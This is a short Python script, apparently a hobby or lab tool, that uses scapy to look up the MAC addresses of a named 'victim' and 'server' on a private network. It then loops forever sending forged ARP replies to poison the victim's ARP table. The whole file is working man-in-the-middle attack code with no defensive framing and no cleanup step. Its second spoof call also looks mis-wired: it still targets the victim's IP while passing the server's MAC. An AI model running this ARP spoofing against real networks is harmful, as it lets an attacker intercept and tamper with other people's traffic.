from scapy.all import ARP, Ether, send, srp


""" this gives us the MAC address of the machine with IP=ip"""
def get_mac_addr(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broadcast = broadcast/arp_request

    answered_list = srp(arp_req_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


victim_ip = '192.168.86.130'
server_ip = '192.168.86.128'

victim_mac=get_mac_addr(victim_ip)
server_mac= get_mac_addr(server_ip)

print(f'Server MAC address: {server_mac}')
print(f'Victim MAC address: {victim_mac}')



#we put our MAC address on the victim table instead of the real spoofed ip MAC address
def spoof(victim_ip, spoof_ip, victim_mac):
    packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
    send(packet, verbose=False)



while True:
    spoof(victim_ip, server_ip, victim_mac)
    spoof(victim_ip, server_ip, server_mac)

